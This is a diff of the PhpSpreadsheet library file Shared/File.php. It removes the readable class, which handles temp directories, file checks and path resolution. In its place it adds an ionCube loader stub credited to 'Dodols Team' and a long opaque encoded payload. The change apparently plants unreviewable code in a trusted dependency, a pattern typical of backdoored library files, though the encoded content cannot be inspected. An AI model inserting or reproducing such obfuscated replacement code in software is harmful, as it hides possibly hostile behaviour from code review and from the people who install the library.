@@ -1,144 +1,78 @@
-<?php
-
-namespace PhpOffice\PhpSpreadsheet\Shared;
-
-use InvalidArgumentException;
-use ZipArchive;
-
-class File
-{
-    /**
-     * Use Temp or File Upload Temp for temporary files.
-     *
-     * @var bool
-     */
-    protected static $useUploadTempDirectory = false;
-
-    /**
-     * Set the flag indicating whether the File Upload Temp directory should be used for temporary files.
-     *
-     * @param bool $useUploadTempDir Use File Upload Temporary directory (true or false)
-     */
-    public static function setUseUploadTempDirectory($useUploadTempDir)
-    {
-        self::$useUploadTempDirectory = (bool) $useUploadTempDir;
-    }
-
-    /**
-     * Get the flag indicating whether the File Upload Temp directory should be used for temporary files.
-     *
-     * @return bool Use File Upload Temporary directory (true or false)
-     */
-    public static function getUseUploadTempDirectory()
-    {
-        return self::$useUploadTempDirectory;
-    }
-
-    /**
-     * Verify if a file exists.
-     *
-     * @param string $pFilename Filename
-     *
-     * @return bool
-     */
-    public static function fileExists($pFilename)
-    {
-        // Sick construction, but it seems that
-        // file_exists returns strange values when
-        // doing the original file_exists on ZIP archives...
-        if (strtolower(substr($pFilename, 0, 3)) == 'zip') {
-            // Open ZIP file and verify if the file exists
-            $zipFile = substr($pFilename, 6, strpos($pFilename, '#') - 6);
-            $archiveFile = substr($pFilename, strpos($pFilename, '#') + 1);
-
-            $zip = new ZipArchive();
-            if ($zip->open($zipFile) === true) {
-                $returnValue = ($zip->getFromName($archiveFile) !== false);
-                $zip->close();
-
-                return $returnValue;
-            }
-
-            return false;
-        }
-
-        return file_exists($pFilename);
-    }
-
-    /**
-     * Returns canonicalized absolute pathname, also for ZIP archives.
-     *
-     * @param string $pFilename
-     *
-     * @return string
-     */
-    public static function realpath($pFilename)
-    {
-        // Returnvalue
-        $returnValue = '';
-
-        // Try using realpath()
-        if (file_exists($pFilename)) {
-            $returnValue = realpath($pFilename);
-        }
-
-        // Found something?
-        if ($returnValue == '' || ($returnValue === null)) {
-            $pathArray = explode('/', $pFilename);
-            while (in_array('..', $pathArray) && $pathArray[0] != '..') {
-                $iMax = count($pathArray);
-                for ($i = 0; $i < $iMax; ++$i) {
-                    if ($pathArray[$i] == '..' && $i > 0) {
-                        unset($pathArray[$i], $pathArray[$i - 1]);
-
-                        break;
-                    }
-                }
-            }
-            $returnValue = implode('/', $pathArray);
-        }
-
-        // Return
-        return $returnValue;
-    }
-
-    /**
-     * Get the systems temporary directory.
-     *
-     * @return string
-     */
-    public static function sysGetTempDir()
-    {
-        if (self::$useUploadTempDirectory) {
-            //  use upload-directory when defined to allow running on environments having very restricted
-            //      open_basedir configs
-            if (ini_get('upload_tmp_dir') !== false) {
-                if ($temp = ini_get('upload_tmp_dir')) {
-                    if (file_exists($temp)) {
-                        return realpath($temp);
-                    }
-                }
-            }
-        }
-
-        return realpath(sys_get_temp_dir());
-    }
-
-    /**
-     * Assert that given path is an existing file and is readable, otherwise throw exception.
-     *
-     * @param string $filename
-     *
-     * @throws InvalidArgumentException
-     */
-    public static function assertFile($filename)
-    {
-        if (!is_file($filename)) {
-            throw new InvalidArgumentException('File "' . $filename . '" does not exist.');
-        }
-
-        if (!is_readable($filename)) {
-            throw new InvalidArgumentException('Could not open "' . $filename . '" for reading.');
-        }
-    }
-}
+<?php //00551
+// --------------------------
+// Created by Dodols Team
+// --------------------------
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
+5fQK1jiShG5TTlHP93LrWHAnNgwyLOZnrm==
